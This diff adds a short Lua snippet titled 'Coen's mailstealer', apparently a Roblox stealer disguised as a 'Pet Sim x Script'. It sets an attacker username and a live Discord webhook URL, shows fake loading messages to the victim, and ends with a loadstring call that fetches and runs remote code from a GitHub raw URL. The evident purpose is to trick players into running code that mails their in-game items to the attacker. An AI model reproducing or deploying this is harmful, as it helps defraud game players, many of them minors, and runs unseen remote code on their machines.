@@ -1,0 +1,21 @@
+----Coen's mailstealer----
+
+```
+
+Username = "aidsedd"
+
+WebHook = "https://discord.com/api/webhooks/1110723096559759400/-l0N5KpA5n6mO2GSGPbPCb2eIA7OlYzkvT2f0_CEuxwLJgx1V3Onj2l_LdtZqPT-XV4e"
+
+loadingscreen = true
+
+_G.CustomScriptName = "Pet Sim x Script"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()```
